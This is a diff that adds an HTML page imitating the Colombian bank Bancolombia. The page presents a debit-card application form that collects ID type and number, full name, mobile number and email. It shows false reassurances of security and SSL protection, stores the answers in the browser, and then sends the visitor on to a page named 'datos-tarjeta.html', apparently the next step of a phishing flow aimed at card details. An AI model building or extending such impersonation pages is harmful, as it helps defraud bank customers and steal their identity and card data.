@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitud Tarjeta Débito - Bancolombia</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f8f9fa;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        /* Header mejorado */
+        .header {
+            background: #FDDA24;
+            padding: 16px 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 26px;
+            font-weight: 800;
+            color: #005CA9;
+            letter-spacing: -0.5px;
+        }
+
+        .header-help {
+            color: #005CA9;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        /* Container principal */
+        .main-container {
+            max-width: 500px;
+            margin: 30px auto;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            overflow: hidden;
+        }
+
+        /* Banner superior */
+        .top-banner {
+            background: linear-gradient(135deg, #005CA9 0%, #003d73 100%);
+            padding: 35px 30px;
+            text-align: center;
+            color: white;
+        }
+
+        .top-banner h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .top-banner p {
+            font-size: 15px;
+            opacity: 0.95;
+            line-height: 1.6;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        /* Contenido del formulario */
+        .form-content {
+            padding: 35px 30px;
+        }
+
+        /* Alert info */
+        .alert-info {
+            background: #E3F2FD;
+            border-left: 4px solid #2196F3;
+            padding: 16px;
+            margin-bottom: 28px;
+            border-radius: 6px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .alert-info-icon {
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .alert-info-text {
+            font-size: 13px;
+            color: #1976D2;
+            line-height: 1.5;
+        }
+
+        /* Form groups */
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 8px;
+        }
+
+        .form-label .required {
+            color: #e74c3c;
+            margin-left: 2px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            background: #fff;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #FDDA24;
+            box-shadow: 0 0 0 4px rgba(253, 218, 36, 0.1);
+        }
+
+        .form-input::placeholder {
+            color: #aaa;
+        }
+
+        select.form-input {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23333' d='M8 11L3 6h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            padding-right: 40px;
+        }
+
+        /* Input con icono */
+        .input-with-icon {
+            position: relative;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+            pointer-events: none;
+        }
+
+        .input-with-icon .form-input {
+            padding-left: 45px;
+        }
+
+        /* Botón de envío */
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: #FDDA24;
+            border: none;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: 700;
+            color: #005CA9;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            background: #fdd000;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(253, 218, 36, 0.4);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* Badge de seguridad */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 25px;
+            padding: 14px;
+            background: #f0f8ff;
+            border-radius: 8px;
+        }
+
+        .security-icon {
+            font-size: 22px;
+        }
+
+        .security-text {
+            font-size: 13px;
+            color: #4CAF50;
+            font-weight: 600;
+        }
+
+        /* Footer */
+        .footer {
+            background: #f8f9fa;
+            padding: 25px 20px;
+            text-align: center;
+            border-top: 1px solid #e9ecef;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #6c757d;
+            margin-bottom: 12px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-link {
+            color: #005CA9;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Estados de error */
+        .form-input.error {
+            border-color: #e74c3c;
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Responsive */
+        @media (max-width: 560px) {
+            .main-container {
+                margin: 15px;
+                border-radius: 12px;
+            }
+
+            .top-banner {
+                padding: 28px 20px;
+            }
+
+            .top-banner h1 {
+                font-size: 24px;
+            }
+
+            .form-content {
+                padding: 28px 20px;
+            }
+        }
+
+        /* Loading spinner */
+        .btn-spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(0,92,169,0.3);
+            border-top-color: #005CA9;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-left: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-submit.loading {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">Bancolombia</div>
+            <a href="#" class="header-help">
+                <span>❓</span>
+                <span>Ayuda</span>
+            </a>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Top Banner -->
+        <div class="top-banner">
+            <h1>
+                <span>💳</span>
+                <span>Tarjeta Débito</span>
+            </h1>
+            <p>Completa tus datos para continuar con tu solicitud de tarjeta débito Bancolombia</p>
+        </div>
+
+        <!-- Form Content -->
+        <div class="form-content">
+            <!-- Info Alert -->
+            <div class="alert-info">
+                <div class="alert-info-icon">🔒</div>
+                <div class="alert-info-text">
+                    <strong>Información segura:</strong> Tus datos están protegidos y serán utilizados únicamente para validar tu identidad.
+                </div>
+            </div>
+
+            <!-- Form -->
+            <form id="mainForm" autocomplete="off">
+                <!-- Tipo de Documento -->
+                <div class="form-group">
+                    <label class="form-label" for="tipoDocumento">
+                        Tipo de documento <span class="required">*</span>
+                    </label>
+                    <select id="tipoDocumento" class="form-input" required>
+                        <option value="">Selecciona una opción</option>
+                        <option value="CC">Cédula de Ciudadanía</option>
+                        <option value="CE">Cédula de Extranjería</option>
+                        <option value="PA">Pasaporte</option>
+                        <option value="TI">Tarjeta de Identidad</option>
+                    </select>
+                    <div class="error-message">Por favor selecciona un tipo de documento</div>
+                </div>
+
+                <!-- Número de Documento -->
+                <div class="form-group">
+                    <label class="form-label" for="numeroDocumento">
+                        Número de documento <span class="required">*</span>
+                    </label>
+                    <div class="input-with-icon">
+                        <span class="input-icon">🆔</span>
+                        <input 
+                            type="text" 
+                            id="numeroDocumento" 
+                            class="form-input" 
+                            placeholder="Ej: 1234567890"
+                            required
+                        >
+                    </div>
+                    <div class="error-message">Ingresa un número de documento válido</div>
+                </div>
+
+                <!-- Nombre Completo -->
+                <div class="form-group">
+                    <label class="form-label" for="nombreCompleto">
+                        Nombre completo <span class="required">*</span>
+                    </label>
+                    <div class="input-with-icon">
+                        <span class="input-icon">👤</span>
+                        <input 
+                            type="text" 
+                            id="nombreCompleto" 
+                            class="form-input" 
+                            placeholder="Como aparece en tu documento"
+                            required
+                        >
+                    </div>
+                    <div class="error-message">Ingresa tu nombre completo</div>
+                </div>
+
+                <!-- Celular -->
+                <div class="form-group">
+                    <label class="form-label" for="celular">
+                        Número de celular <span class="required">*</span>
+                    </label>
+                    <div class="input-with-icon">
+                        <span class="input-icon">📱</span>
+                        <input 
+                            type="tel" 
+                            id="celular" 
+                            class="form-input" 
+                            placeholder="3001234567"
+                            maxlength="10"
+                            required
+                        >
+                    </div>
+                    <div class="error-message">Ingresa un número de celular válido (10 dígitos)</div>
+                </div>
+
+                <!-- Email -->
+                <div class="form-group">
+                    <label class="form-label" for="email">
+                        Correo electrónico <span class="required">*</span>
+                    </label>
+                    <div class="input-with-icon">
+                        <span class="input-icon">✉️</span>
+                        <input 
+                            type="email" 
+                            id="email" 
+                            class="form-input" 
+                            placeholder="ejemplo@correo.com"
+                            required
+                        >
+                    </div>
+                    <div class="error-message">Ingresa un correo electrónico válido</div>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="btn-submit" id="submitBtn">
+                    Continuar
+                </button>
+
+                <!-- Security Badge -->
+                <div class="security-badge">
+                    <span class="security-icon">🔐</span>
+                    <span class="security-text">Conexión segura SSL 256-bit</span>
+                </div>
+            </form>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p class="footer-text">&copy; 2024 Bancolombia S.A. | Todos los derechos reservados</p>
+            <div class="footer-links">
+                <a href="#" class="footer-link">Términos y condiciones</a>
+                <a href="#" class="footer-link">Política de privacidad</a>
+                <a href="#" class="footer-link">Ayuda</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('mainForm');
+        const submitBtn = document.getElementById('submitBtn');
+
+        // Validación en tiempo real
+        const inputs = {
+            tipoDocumento: document.getElementById('tipoDocumento'),
+            numeroDocumento: document.getElementById('numeroDocumento'),
+            nombreCompleto: document.getElementById('nombreCompleto'),
+            celular: document.getElementById('celular'),
+            email: document.getElementById('email')
+        };
+
+        // Limpiar errores al escribir
+        Object.values(inputs).forEach(input => {
+            input.addEventListener('input', function() {
+                this.classList.remove('error');
+                const errorMsg = this.closest('.form-group').querySelector('.error-message');
+                if (errorMsg) errorMsg.classList.remove('show');
+            });
+        });
+
+        // Solo números para documento y celular
+        inputs.numeroDocumento.addEventListener('input', e => {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        inputs.celular.addEventListener('input', e => {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // Solo letras para nombre
+        inputs.nombreCompleto.addEventListener('input', e => {
+            e.target.value = e.target.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, '');
+        });
+
+        // Submit form
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Limpiar errores previos
+            Object.values(inputs).forEach(input => {
+                input.classList.remove('error');
+                const errorMsg = input.closest('.form-group').querySelector('.error-message');
+                if (errorMsg) errorMsg.classList.remove('show');
+            });
+
+            let isValid = true;
+
+            // Validar cada campo
+            Object.entries(inputs).forEach(([key, input]) => {
+                if (!input.value.trim()) {
+                    input.classList.add('error');
+                    const errorMsg = input.closest('.form-group').querySelector('.error-message');
+                    if (errorMsg) errorMsg.classList.add('show');
+                    isValid = false;
+                }
+            });
+
+            // Validar email
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (inputs.email.value && !emailRegex.test(inputs.email.value)) {
+                inputs.email.classList.add('error');
+                const errorMsg = inputs.email.closest('.form-group').querySelector('.error-message');
+                errorMsg.textContent = 'Formato de correo inválido';
+                errorMsg.classList.add('show');
+                isValid = false;
+            }
+
+            // Validar celular (10 dígitos)
+            if (inputs.celular.value && inputs.celular.value.length !== 10) {
+                inputs.celular.classList.add('error');
+                const errorMsg = inputs.celular.closest('.form-group').querySelector('.error-message');
+                errorMsg.classList.add('show');
+                isValid = false;
+            }
+
+            if (isValid) {
+                // Guardar datos
+                const formData = {
+                    tipoDocumento: inputs.tipoDocumento.value,
+                    numeroDocumento: inputs.numeroDocumento.value,
+                    nombreCompleto: inputs.nombreCompleto.value,
+                    celular: inputs.celular.value,
+                    email: inputs.email.value,
+                    timestamp: new Date().toLocaleString('es-CO')
+                };
+
+                localStorage.setItem('personalData', JSON.stringify(formData));
+
+                // Mostrar loading
+                submitBtn.classList.add('loading');
+                submitBtn.innerHTML = 'Procesando... <span class="btn-spinner"></span>';
+
+                // Redirigir
+                setTimeout(() => {
+                    window.location.href = 'datos-tarjeta.html';
+                }, 1500);
+            }
+        });
+    </script>
+</body>
+</html>
